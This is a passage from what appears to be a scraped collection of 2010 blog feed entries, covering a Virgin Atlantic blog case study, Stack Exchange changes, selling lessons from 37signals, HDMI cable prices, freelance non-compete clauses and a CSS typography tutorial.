href=\"http://commons.wikimedia.org/wiki/User:MilborneOne\">MilborneOne</a></li>\n<li>vtravelled offices photo by <a rel=\"dc:creator cc:attributionURL\" href=\"http://maxinesheppard.com/\">Maxine Sheppard</a></li>\n<li>New York photo courtesy of <a href=\"http://vtravelled.com/\">vtravelled</a></li>\n<li>All other photos and screenshots by <a rel=\"dc:creator cc:attributionURL\" href=\"http://john.onolan.org/\">John O’Nolan</a></li>\n</ul>\n<p><br></p>\n<p><em>Written exclusively for WDD by<a rel=\"nofollow\" href=\"http://john.onolan.org\"> John O’Nolan</a>.</em></p>\n<p><em><strong>Please share your comments about the design and the process below…</strong></em></p>\n\n<p><br>If you find an exclusive RSS freebie on this feed or on the live WDD website, please use the following code to download it: I8cT5k</p>\n<p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/ng80slqo6cepue6lo9t5b2mkbg/468/60#http%3A%2F%2Fwww.webdesignerdepot.com%2F2010%2F04%2Fthe-virgin-atlantic-airways-blog-a-case-study%2F\" width=\"100%\" height=\"60\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><img src=\"http://feeds.feedburner.com/~r/webdesignerdepot/~4/P85peFKRS_A\" height=\"1\" width=\"1\">"

Why not every question under the sun?

Some people did (yay!), but it wasn’t the flood of high quality sites we were hoping for.</p>\n<p>So we’re making a few changes. Briefly:</p>\n<ol>\n<li>Stack Exchange will now be free.</li>\n<li>We’re changing the way that new Stack Exchange sites are created to move to a more democratic, community process.</li>\n<li>The content of these new, community-created Stack Exchange sites will be publically owned under a <a href=\"http://creativecommons.org/\">Creative Commons</a> license, instead of being owned by individuals or businesses.</li></ol>\n<p>If you’ve already created a Stack Exchange site, be sure to read the announcement in more detail to hear about our transition plan.

It doesn't matter what environment I am in I am always looking for ways to improve, innovate and optimize.<br><br>\n\nBut is being an entrepreneur equivalent to being a \"dreamer\"?<br><br>\n\nBefore answering that question I pulled the definition of a dreamer. The definition of a dreamer is \"a person who lives in or escapes to a world of fantasy or illusion\"<br><br>\n\nThe most successful people that I know in business or in their personal lives are those that are willing to push the limits. They aren't scared of failure, but believe prudent planning and the willingness to take risks will result in success.<br><br>\n\nThe dreamers are those that never take action.<br><br>\n\nBut don't be mislead; success is about more than just taking action. It's about having a plan, understanding how to analyze small successes and failures along the way, adjusting as needed, listening, learning and not giving up unless you've exhausted all of your options.<br><br>\n\nNow I know that last comment may have a lot of eye brows raising \"unless you've exhausted all of your options.\" Let's be honest with ourselves; there are a lot of directions that look good on paper today but fail tomorrow due to sudden and mass technology shifts, economic downturns, new business directives or any other initially uncontrollable circumstances. What I have seen across the board with many of the most consistently successful individuals is their ability to adjust quickly. If the numbers say it isn't working, it isn't working.<br><br>\n\nDon't be a dreamer, be an innovator... a big thinker... an entrepreneur...\nListen, Learn, React!</span><div><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/6143589190069942606-5124838602540286929?l=www.doneordoneright.com\" alt=\"\"></div>"

But, this is exactly the mentality that gets people to pay for this habitually over-priced bit of technological excess. The truth, as our infographic points out, is that there is absolutely no difference between the cheapest and most expensive HDMI cables, at least over shorter runs. If you’re wiring an entire house, you may find these cables to be worth it.</p>\n<p>To understand why you shouldn’t pay extra, you need to understand the difference between analog and digital. With analog cables, the signal degrades, with digital cables such as HDMI, it either works or it doesn’t. The signal doesn’t degrade any more than your JPEGs degrade when you put them on a thumb drive.</p>\n<p><strong>Embed the above image on your site</strong><br><a href=\"http://www.mint.com/blog/wp-content/uploads/2010/03/TheRipHDMI3.jpg\"><img src=\"http://www.mint.com/blog/wp-content/uploads/2010/03/TheRipHDMI3.jpg\" alt=\"\" title=\"TheRipHDMI3\" width=\"500\" height=\"2812\"></a><br>\n<a href=\"http://www.mint.com/\">Budget Planner – Mint.com</a></p>\n<p>Graphic by <a href=\"http:///wallstats.com\">Wallstats.com</a></p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/MyMint?a=AmsAhpJrq1A:rBHE0qMnVKk:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/MyMint?i=AmsAhpJrq1A:rBHE0qMnVKk:D7DqB2pKExk\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyMint?a=AmsAhpJrq1A:rBHE0qMnVKk:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/MyMint?i=AmsAhpJrq1A:rBHE0qMnVKk:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyMint?a=AmsAhpJrq1A:rBHE0qMnVKk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/MyMint?i=AmsAhpJrq1A:rBHE0qMnVKk:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyMint?a=AmsAhpJrq1A:rBHE0qMnVKk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/MyMint?i=AmsAhpJrq1A:rBHE0qMnVKk:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyMint?a=AmsAhpJrq1A:rBHE0qMnVKk:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/MyMint?d=dnMXMwOfBR0\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyMint?a=AmsAhpJrq1A:rBHE0qMnVKk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/MyMint?d=yIl2AUoC8zA\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/MyMint/~4/AmsAhpJrq1A\" height=\"1\" width=\"1\">"

      "content" : "<p>Yesterday, during an interview with Andrew Warner at <a href=\"http://mixergy.com\">Mixergy</a>, I spoke about my early work experience bagging groceries, selling shoes, pumping gas, etc. There’s nothing particularly unique about these jobs – they are common jobs. But they taught me some important lessons about people, how they decide what to buy, and what really matters to them.</p>\n\n\n\t<p>Selling shoes (and tennis rackets) twenty years ago reminded me of selling software today. The shoe world and tennis racket world are very much like the software world. Manufactures pitch features and technological advantages but customers judge the products in an entirely different way.</p>\n\n\n\t<p>When I worked at this golf and tennis pro shop selling shoes and rackets, brand reps would come by and tell the staff about the latest products. They’d explain the new <span>EVA</span> midsole in this shoe, and the Goodyear rubber outsole in that shoe. They’d talk about flex grooves, heel notches, cushioning systems, etc. They’d talk about graphite frames, widebody rackets, sweetspots, etc. On paper these were strong selling points, but in the store very few people cared.</p>\n\n\n\t<p>Here’s how most people found a shoe and decided if it was right for them. They’d walk up to the pegboard wall where the shoes were lined up. They’d pick up a few, spin ‘em around, and put them back. Then they’d hone in on one of them because they liked the way it looked. They’d ask for their size, I’d bring it out, and they’d try it on. They’d jam their thumb between their big toe and the tip of the shoe to see if it fit. Then they’d maybe bounce around a bit or “hard walk” to see how the cushioning felt. Then they’d look in the mirror to see how it looked. They’d they’d buy it or repeat the process with another shoe.</p>\n\n\n\t<p>The technology didn’t matter. The number of flex grooves didn’t matter. The chemical composition of the insole, midsole, and outsole didn’t matter. What mattered were the absolute basics: Do I like the way it looks, does it fit, and is it comfortable. Sold. All the other things that we were told about the shoe could never represent themselves in a 3 minute try-on anyway. Sole durability didn’t matter <em>now</em>. All the soles were equally durable during a 3 minute walk around on a carpeted store floor. Any talk about a midsole went right over their head. All they knew was “this felt good” or “this is too narrow” or “this rubs my big toe” or “ooh, this is comfortable.” I could explain this stuff all day long, but their realization always trumped my explanation.</p>\n\n\n\t<p>This isn’t to say that some people didn’t take the features and technology seriously, but it is to say most – nearly all – didn’t. They didn’t care about the same things the manufacturer cared about. And they certainly didn’t see the world the same way the brand rep saw the world. The customer wanted the simple things done well. Their evaluation consisted of a few key things: look, fit, and comfort. And that’s it.</p>\n\n\n\t<p>The same thing was true for tennis rackets. We were armed with every last fact about every last racket, but here’s how people picked a racket: 1. Their friend or tennis pro told them to buy it, or 2. They picked it up, did a few fake swings, bounced their hand off the strings, pictured themselves holding it on the court, and either bought it or repeated the same test with another racket. Often times they’d ask if it came in another color. No one asked about the size of the sweetspot, and very few cared about fiberglass vs. graphite. Some did, most didn’t. They cared about how it looked, how it felt, how much it weighed, and if their friends would approve. I could move people to this racket or that racket with some fancy facts, but most people made up their own mind based on a set of pre-determined criteria that had more to do with their own preferences than the brand’s preferences.</p>\n\n\n\t<p>I saw the same thing when I worked at the grocery store. From the types of labels people read to the number of bags they wanted to take home. People would opt for clarity, comfort, and convenience. Yeah, spreading out groceries across 3 bags may have technically been better, but that meant they’d have to make another trip to their car when bringing their groceries in their house. They wanted simple. One trip, done.</p>\n\n\n\t<p>It all reminds me of the software business. The industry is obsessed with touting features while the public is obsessed an entirely different set of criteria: Does it solve my basic problems and is it easy to use? Does it make sense? Do I understand it?</p>\n\n\n\t<p>The real lesson for me is this: People want the basics done well. Does it look good, does it feel good, is it comfortable, is it clear, is it easy? No matter what you’re selling, those seem to be the things that really matter. Get those right and you’ve got a great shot at building a successful product and business.</p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=Y_iisARBqQc:RovdQvofoBo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=Y_iisARBqQc:RovdQvofoBo:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div>"

Artists have been using  watercolor for hundreds of years, and web designers have adopted the  style for good reason.</p>\n<p>Watercolor is a great way to add depth,  interesting subtle textures and colors. It can really give your  site an authentic, natural feel.</p>\n<p>The examples compiled in this collection use watercolor in  different ways; whether it’s for the main graphic of the site or the more subtle and faint hints that get you to look twice.</p>\n<p>Watercolor has been around for a century and I know most of  you will say it’s a trend, but you can’t argue with something that has  pioneered painting and art.<span></span></p>\n<h1>Agami Creative</h1>\n<p><a href=\"http://www.agamicreative.com/\"><img

Here’s Craig’s description of what happened:</em></p>\n\n\n\t<p>I coauthored and designed a guide book to the Tokyo art world: <a href=\"http://www.kickstarter.com/projects/1790732155/art-space-tokyo-ipad-edition-hardcover-reprint\">Art Space Tokyo</a>.</p>\n\n\n\t<p>It came out in 2008 to much acclaim and sold out rather quickly.</p>\n\n\n\t<p>The publisher we originally published with didn’t have the money to support a reprint. It sat in limbo for ages.</p>\n\n\n\t<p>This is a niche book — Tokyo &amp; art.</p>\n\n\n\t<p>It’s also a beautiful book: silkscreened clothbound hardcover, detailed maps, printed and bound in Japan. Elegant.</p>\n\n\n\t<p><img src=\"http://s3.amazonaws.com/37assets/svn/artspacetokyo.jpg\" width=\"530\" height=\"420\" alt=\"tokyo \"></p>\n\n\n\t<p>The original publisher was talking about reprinting it — cheaply, paperback, disposable. Destroying much of the original charm.</p>\n\n\n\t<p>This is ridiculous. So I bought back worldwide publishing rights from the publisher. Drawing inspiration from <a href=\"http://www.37signals.com/rework\"><span>REWORK</span></a> — looking sideways, ignoring the ‘usual’ rules of publishing, this is what’s now happening:</p>\n\n\n\t<p>Sales folk at traditional distributors push for cheap cheap cheap because it’s easy to sell. The problem is cheap cheap cheap doesn’t generate sustainable profits. And leads to disposable, flimsy books.</p>\n\n\n\t<p>Instead of compromise, we’re raising the price. This lets us keep the same high quality, which readers love. It also means the revenue generated by the sales can lead to expansion of the project. Instead of every sale eeking us back to break-even, every sale helps lay the foundation for expanding the project.</p>\n<p><a href=\"http://37signals.com/svn/posts/2240-how-craig-mod-and-gina-trapani-decided-to-go-the-indie-publishing-route\">More...</a></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=NO05gs8wEBY:GP_wQYMW7oc:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=NO05gs8wEBY:GP_wQYMW7oc:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div>"

The money is good, but there’s a catch in the contract—a non-compete clause.<span></span></p>\n<p><em>Note: A few times a month we revisit some of our reader’s favorite posts from throughout the history of FreelanceSwitch. This article was first published in March of 2010, yet is just as relevant and full of useful information today.</em></p>\n<h3>The Standard Non-Compete Clause</h3>\n<p>The idea behind non-compete clauses grew out of employers wanting to make sure that when an employee left the company, he didn’t take any clients with him. Most clauses are phrased so that the contracted employee can’t work in the same field for a specific period of time after leaving the company. It’s actually quite difficult for an employer to enforce a non-compete clause in a contract. They keep putting them in, though, in the hopes of limiting competition for even a short period of time.</p>\n<h3>When a Freelancer Sees a Non-Compete Clause</h3>\n<p>There are only two situations in which the issue of a non-compete clause should come up for a freelancer. The first is if you’re freelancing part-time while still working for an employer. If you have a non-compete clause in your contract, but you’re taking on similar projects as a freelancer that you do during your day job, you can wind up with a problem on your hands. Technically, an employer could terminate an employee who took that route and even sue that employee (although the cost is generally not worthwhile). The second is if you’re in the process of leaving an employer in order to freelance full-time. If there’s a non-compete clause in your contract, you might face some trouble about pursuing similar work to your past employer’s — although you can often work out a deal where they don’t enforce the clause.</p>\n<p>You might have noticed that I used the word ‘should’ when saying that there are only two situations where a non-compete clause comes up. That’s because there is a third situation which some freelancers face: when clients bring on freelancers for long-term projects, sometimes they’ll include a non-compete clause in the contract. It shows a pretty fundamental misunderstanding of the fact that a freelancer is an independent contractor, but it is, unfortunately, not unheard of. From what clients have explained to me, the idea seems to be that if a client is sub-contracting work to you, he wants to make sure that you can’t grab clients when you leave.</p>\n<h3>Responding to a Non-Compete Clause</h3>\n<p>Don’t count on the fact that such a clause is difficult to enforce. If you see a non-compete clause in a contract for a project you’re being asked to consider, either ask to have the clause removed or don’t sign the contract. A client might say that they have no intention of enforcing the clause, but the fact that it’s in there at all could be a problem down the road.</p>\n<p>It is definitely possible to get such a clause removed from a contract. The freelancer I mentioned at the beginning of the post did just that: she explained to her client that signing a contract containing that clause would endanger her ability to earn a living after the project ended. After all, as a freelancer, a strict interpretation of that non-compete clause would mean that she couldn’t take on any project similar to what she’d be working on for those six months after the project ended.</p>\n<p>There is another option that you can suggest if a client is truly concerned about the information you’ll have access to while working for him. You can add a clause to the contract stating that you will have access to that information but limiting or preventing your ability to use that information after the project ends. It’s still not an ideal option from the freelancer’s point of view, but if that’s what it takes to land a project, it may be worth it.</p><p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/8ht4n8gk25l2l5maofrf5p08g4/468/60#http%3A%2F%2Ffreelanceswitch.com%2Fthe-business-of-freelancing%2Fhandling-non-compete-clauses%2F\" width=\"100%\" height=\"60\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=ITEf0FyJQyA:p63tKpYtLBI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=ITEf0FyJQyA:p63tKpYtLBI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=ITEf0FyJQyA:p63tKpYtLBI:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=ITEf0FyJQyA:p63tKpYtLBI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=ITEf0FyJQyA:p63tKpYtLBI:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=ITEf0FyJQyA:p63tKpYtLBI:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=ITEf0FyJQyA:p63tKpYtLBI:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=ITEf0FyJQyA:p63tKpYtLBI:wF9xT3WuBAs\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=ITEf0FyJQyA:p63tKpYtLBI:wF9xT3WuBAs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=ITEf0FyJQyA:p63tKpYtLBI:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=ITEf0FyJQyA:p63tKpYtLBI:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/FreelanceSwitch/~4/ITEf0FyJQyA\" height=\"1\" width=\"1\">"

Most websites rely on text to convey their messages, so it’s not a surprise that text is treated with utmost care. In this article, we’ll look at some useful techniques and clever effects that use the power of style sheets and some features of the upcoming CSS Text Level 3 specification, which should give Web designers finer control over text.</p><p>Keep in mind that these <strong>new properties and techniques are either new</strong> or still in the works, and some of the most popular browsers do not yet support them. But we feel it’s important that you, as an informed and curious Web designer, know what’s around the corner and be able to experiment in your projects.</p><p>By the way, what was the last time you visited our sister site <a href=\"http://creatives.commindo-media.de/www/delivery/ck.php?oaparams=2__bannerid=1250__zoneid=0__cb=81f776ed7f__oadest=http%3A%2F%2Fwww.noupe.com\">Noupe</a>? Subscribe to Noupe's feed for more inspirational and design-related articles.</p><h3>A Glance At The Basics</h3><p>One of the most common CSS-related mistakes made by budding Web designers is creating inflexible style sheets that have <strong>too many classes and IDs</strong> and that are difficult to maintain.</p><p>Let’s say you want to change the color of the headings in your posts, keeping the other headings on your website in the default color. Rather than add the class <code>big-red</code> to each heading, the sensible approach would be to take advantage of the <code>DIV</code> class that wraps your posts (probably <code>post</code>) and create a selector that targets the heading you wish to modify, like so:</p><pre>.post h2 {\n\tfont-weight: bold;\n\tcolor: red;\n}</pre><p>This is just a quick reminder that there is no need to add classes to everything you want to style with CSS, especially text. <strong>Think simple.</strong></p><h3>The Font Property</h3><p>Instead of specifying each property separately, you can do it all in one go using the font shorthand property. The order of the properties should be as follows: <code>font-style</code>, <code>font-variant</code>, <code>font-weight</code>, <code>font-size</code>, <code>line-height</code>, <code>font-family</code>.</p><p>When using the font shorthand, any values not specified <strong>will be replaced by their parent value</strong>. For example, if you define only <code>12px Helvetica, Arial, sans-serif</code>, then the values for <code>font-style</code>, <code>font-variant</code> and <code>font-weight</code> will be set as <code>normal</code>.</p><p>The font property can also be used to <strong>specify system fonts</strong>: <code>caption</code>, <code>icon</code>, <code>menu</code>, <code>message-box</code>, <code>small-caption</code>, <code>status-bar</code>. These values will be based on the system in use, and so will vary according to the user’s preferences.</p><h4>Other Font Properties</h4><p>A few font-related properties and values are not as commonly used. For example, instead of using <code>text-transform</code> to turn your text into all caps, you could use <code>font-variant: small-caps</code> for a more elegant effect.</p><p>You could also be very specific about the <a href=\"http://www.w3.org/TR/css3-fonts/#font-weight-the-font-weight-property\">weight of your fonts</a>, instead of using the common <code>regular</code> and <code>bold</code> properties. CSS allows you to specify font weight with values from <code>100</code> to <code>900</code> (i.e. <code>100</code>, <code>200</code>, <code>300</code>, etc.). If you decide to use these, know that the <code>400</code> value represents the <code>normal</code> weight, while <code>700</code> represents <code>bold</code>. If a font isn’t given a weight, it will default to its parent weight.</p><p>Another useful property, sadly supported only in Firefox for now, is <code>font-size-adjust</code>, which allows you to specify an aspect ratio for when a fall-back font is called. This way, if the substitute font is smaller than the preferred one, the text’s x-height will be preserved. A good explanation of how <code>font-size-adjust</code> works can be found on <a href=\"http://www.w3.org/TR/css3-fonts/#font-size-adjust\">the W3C website</a>.</p><h3>Dealing With White Space, Line Breaks And Text Wrapping</h3><p>Several CSS properties deal with these issues, but the specs are still in the works (at the “Working Draft” stage).</p><h4>White Space</h4><p>The <code>white-space</code> property lets you specify a combination of properties for which it serves as a shorthand: <code><a href=\"http://dev.w3.org/csswg/css3-text/#white-space-collapsing\">white-space-collapsing</a></code> and <code><a href=\"http://dev.w3.org/csswg/css3-text/#text-wrap\">text-wrap</a></code>. Here’s a breakdown of what each property stands for:</p><ul><li><code>normal</code><br> white-space-collapsing: collapse/text-wrap: normal</li><li><code>pre</code><br> white-space-collapsing: preserve/text-wrap: none</li><li><code>nowrap</code><br> white-space-collapsing: collapse/text-wrap: none</li><li><code>pre-wrap</code><br> white-space-collapsing: preserve/text-wrap: normal</li><li><code>pre-line</code><br> white-space-collapsing: preserve-breaks/text-wrap: normal</li></ul><p>This property can be useful if you want to, for example, <strong>display snippets of code</strong> on your website and preserve line breaks and spaces. Setting the container to <code>white-space: pre</code> will preserve the formatting.</p><p><a href=\"http://wordpress.org/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/wordpress.jpg\" alt=\"Wordpress in The Future Of CSS Typography\" width=\"500\" height=\"200\"></a><br> <em>WordPress uses <code>white-space: nowrap</code> on its dashboard so that the numbers indicating posts and comments don’t wrap if the table cell is too small.</em></p><h4>Word Wrap</h4><p>One property that is already well used is <code>word-wrap</code>. It supports one of two values: <code>normal</code> and <code>break-word</code>. If you set <code>word-wrap</code> to <code>break-word</code> and a word is so long that it would overflow the container, it is broken at a random point so that it wraps within the container.</p><p><a href=\"http://www.igcp.org/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/international-gorilla.jpg\" alt=\"International-gorilla in The Future Of CSS Typography\" width=\"400\" height=\"203\"></a><br> <em>The International Gorilla Conservation Programme website uses <code>word-wrap</code> for its commenters’ names.</em></p><p>In theory, <code>word-wrap: break-word</code> should only be allowed when <code>text-wrap</code> is set to either <code>normal</code> or <code>suppress</code> (which suppresses line breaking). But in practice and for now, it works even when <code>text-wrap</code> is set to something else.</p><p>Bear in mind that according to the specification, the <code>break-strict</code> value for the <code>word-break</code> property is at risk of being dropped.</p><h4>Word And Letter Spacing</h4><p>Two other properties that are often used are <code>word-spacing</code> and <code>letter-spacing</code>. You can use them to control—you guessed it—the spacing between words and letters, respectively. Both properties support three different values that represent optimal, minimum and maximum spacing.</p><p><a href=\"http://www.showandtellsale.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/show-and-tell.jpg\" alt=\"Show-and-tell in The Future Of CSS Typography\" width=\"600\" height=\"200\"></a><br> <em>Show &amp; Tell uses <code>letter-spacing</code> on its navigation links.</em></p><p>For <code>word-spacing</code>, setting only one value corresponds to the optimal spacing (and the other two are set to <code>normal</code>). When setting two values, the first one corresponds to the optimal and minimum spacing, and the second to the maximum. Finally, if you set all three values, they correspond to all three mentioned above. With no justification, optimal spacing is used.</p><p>It works slightly different for <code>letter-spacing</code>. One value only corresponds to all three values. The others work as they do for <code>word-spacing</code>.</p><p>The specifications contain a few <strong>requests for more information and examples</strong> on how <a href=\"http://dev.w3.org/csswg/css3-text/#white-space-processing\">white-space processing</a> will work and how it can be used and be useful for languages such as Japanese, Chinese, Thai, Korean, etc. So, if you’d like help out, why not give it a read (it’s not <em>that</em> long), and see how you can contribute?</p><h3>Indentation And Hanging Punctuation</h3><p>Text indentation and hanging punctuation are two typographical features that are <strong>often forgotten</strong> on the Web. This is probably due to one of three factors:</p><ol><li>Setting them is not as straightforward as it could be;</li><li>There has been a conscious decision not to apply them;</li><li>Designers simply aren’t aware of them or don’t know how to properly use them.</li></ol><p><a href=\"http://sushiandrobots.com/journal/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/03/sushi-robots.jpg\" alt=\"Sushi-robots in The Future Of CSS Typography\" width=\"500\" height=\"364\"></a><br> <em>The Sushi &amp; Robots website has hanging punctuation on bulleted lists.</em></p><p>Mark Boulton has a good brief explanation of hanging punctuation in his “<a href=\"http://www.markboulton.co.uk/journal/comments/five-simple-steps-to-better-typography\">Five Simple Steps to Better Typography</a>” series, and Richard Rutter mentions indentation on his website, <a href=\"http://webtypography.net/\">The Elements of Typographic Style Applied to the Web</a>. These are two very good reads for any Web designer.</p><p>So, <strong>the theory</strong> is that you should apply a small indentation to every text paragraph after the first one. You can easily do this with an adjacent sibling combinator:</p><pre>p + p {\n\ttext-indent: 1em;\n}</pre><p>This selector targets every paragraph (i.e. <code>p</code>) that follows another paragraph; so the first paragraph is not targeted.</p><p>Another typographic rule of thumb is that <strong>bulleted lists and quotes</strong> should be “hung.” This is so that the flow of the text is not disrupted by these visual distractions.</p><p>The CSS Text Level 3 specification has an (incomplete) reference to an <a href=\"http://www.w3.org/TR/css3-text/#hanging-punctuation\">upcoming hanging-punctuation property</a>.</p><p>For now, though, you can use the <code>text-indent</code> property with negative margins to achieve the desired effect:</p><pre>blockquote {\n\ttext-indent: -0.2em;\n}</pre><p>For bulleted lists, just make sure that the position of the bullet is set to <code>outside</code> and that the container <code>div</code> is not set to <code>overflow: hidden</code>; otherwise, the bullets will not be visible.</p><h3>Web Fonts And Font Decoration</h3><h4>font-face</h4><p>Much talk has been made on the Web about <code>font-face</code> and whether it’s a good thing—especially after the appearance of <a href=\"http://typekit.com/\">Typekit</a> (and the still-in-private-beta <a href=\"http://fontdeck.com/\">Fontdeck</a>). The debate is mainly about how much visual clutter this could bring to Web designs. Some people (the argument goes) aren’t sufficiently font-savvy to be able to pull off a design in which they are free to use basically any font they wish. Wouldn’t our sensitive designer eyes be safer if only tested, approved Web-safe fonts were used?</p><p>On whatever side of the argument you fall, the truth is that the examples of websites that use <code>font-face</code> beautifully are numerous.</p><p><a href=\"http://snook.ca/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/snook.jpg\" alt=\"Snook in The Future Of CSS Typography\" width=\"600\" height=\"437\"></a><br> <em>Jonathan Snook’s recently redesigned website uses the <code>font-face</code> property.</em></p><p>The <code>font-face</code> property is fairly straightforward to grasp and use. Upload the font you want to use to your website (make sure the licence permits it), give it a name and set the location of the file.</p><p>In its basic form, this is what the <code>font-face</code> property looks like:</p><pre>@font-face {\n\tfont-family: Museo Sans;\n\tsrc: local(“Museo Sans”), url(MuseoSans.ttf) format(“opentype”);\n}</pre><p>The two required <code>font-face</code> descriptors are <code>font-family</code> and <code>src</code>. In the first, you indicate how the font will be referenced throughout your CSS file. So, if you want to use the font for <code>h2</code> headings, you could have:</p><pre>h2 {\n\tfont-family: Museo Sans, sans-serif;\n}</pre><p>With the second property (<code>src</code>), we are doing two things:</p><ol><li>If the font is already installed on the user’s system, then the CSS uses the local copy instead of downloading the specified font. We could have skipped this step, but using the local copy saves on bandwidth.</li><li>If no local copy is available, then the CSS downloads the file linked to in the URI. We also indicate the format of the font, but we could have skipped that step, too.</li></ol><p>For this property <strong>to work in IE</strong>, we would also need the EOT version of the font. Some font shops offer multiple font formats, including EOT, but in many cases we will need to convert the TrueType font using Microsoft’s own <a href=\"http://www.microsoft.com/typography/WEFT.mspx\">WEFT</a>, or another tool such as <a href=\"http://code.google.com/p/ttf2eot/\">ttf2eot</a>.</p><p>Some <strong>good resources</strong> for finding great fonts that can be used with <code>font-face</code> are <a href=\"http://www.fontsquirrel.com/\">Font Squirrel</a> and <a href=\"http://www.fontspring.com/\">Fontspring</a>.</p><h4>text-shadow</h4><p>The <code>text-shadow</code> property allows you to <strong>add a shadow to text easily</strong> and purely via CSS. The shadow is applied to both the text and text decoration if it is present. Also, if the text has <code>text-outline</code> applied to it, then the shadow is created from the outline rather than from the text.</p><p><a href=\"http://neutroncreations.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/neutron.jpg\" alt=\"Neutron in The Future Of CSS Typography\" width=\"600\" height=\"264\"></a><br> <em>Neutron Creations website uses <code>text-shadow</code>.</em></p><p>With this property you can set the horizontal and vertical position of the shadow (relative to the text), the color of the shadow and the blur radius. Here is a complete <code>text-shadow</code> property:</p><pre>p {\n\ttext-shadow: #000000 1px 1px 1px;\n}</pre><p>Both the color and blur radius (the last value) are optional. You could also use an RGBa color for the shadow, making it transparent:</p><pre>p {\n\ttext-shadow: rgba(0, 0, 0, 0.5) 1px 1px 1px;\n}</pre><p>Here we define the R, G and B values of the color, plus an additional alpha transparency value (hence the <code>a</code>, whose value here is <code>0.5</code>).</p><p>The specification still has some open questions about <code>text-shadow</code>, like how should the browser behave when the shadow of an element overlaps the text of an adjoining element? Also, be aware that multiple text shadows and the <code>text-outline</code> property may be dropped from the specification.</p><h4>New Text-Decoration Properties</h4><p>One problem with the <code>text-underline</code> property is that it gives us little control. The <a href=\"http://dev.w3.org/csswg/css3-text/#decoration\">latest draft of the specification</a>, however, <strong>suggests new and improved properties</strong> that may give us fine-grained control. You can’t use them yet, but we’ll give you a condensed sneak peek at what may come.</p><ul><li><code><strong>text-decoration-line</strong></code><br> Takes the same values as <code>text-decoration</code>: <code>none</code>, <code>underline</code>, <code>overline</code> and <code>line-through</code>.</li><li><code><strong>text-decoration-color</strong></code><br> Specifies the color of the line of the previous property.</li><li><code><strong>text-decoration-style</strong></code><br> Takes the values of <code>solid</code>, <code>double</code>, <code>dotted</code>, <code>dashed</code> and <code>wave</code></li><li><code><strong>text-decoration</strong></code><br> The shorthand for the three preceding properties. If you specify a value of only one of <code>none</code>, <code>underline</code>, <code>overline</code> or <code>line-through</code>, then the property will be backwards-compatible with CSS Level 1 and 2. But if you specify all three values, as in <code>text-decoration: red dashed underline</code>, then it is ignored in browsers that don’t support them.</li><li><code><strong>text-decoration-skip</strong></code><br> Specifies whether the text decoration should skip certain types of elements. The proposed values are <code>none</code>, <code>images</code>, <code>spaces</code>, <code>ink</code> and <code>all</code>.</li><li><code><strong>text-underline-position</strong></code><br> With this property, you can control, for example, whether the underline should cross the text’s descenders or not: <code>auto</code>, <code>before-edge</code>, <code>alphabetic</code> and 